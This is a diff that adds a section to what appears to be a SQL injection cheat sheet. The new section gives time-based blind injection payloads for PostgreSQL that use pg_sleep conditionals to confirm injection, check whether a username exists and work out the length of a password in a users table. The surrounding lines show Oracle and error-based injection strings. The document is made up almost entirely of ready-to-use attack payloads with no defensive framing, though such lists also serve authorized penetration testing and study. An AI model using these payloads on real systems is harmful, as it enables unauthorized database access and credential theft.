@@ -90,6 +90,22 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 
 
 
+#Blind SQL injection with time delays and information retrieval
+
+1) PostrgreSQL
+
+' || (select case when (1=1) then pg_sleep(10 ) else pg_sleep (-1) end)-- -
+
+' || (select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- - or, ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users-- -
+
+' || (select case when (username='[username here]') then pg_sleep(5) else pg_sleep(-1) end from [table name here])-- -
+
+' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -
+
+';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
+
+
+
 #Visible Error-Based Sql Injection
 
 '||cast((select version() LIMIT 1) AS INT)--
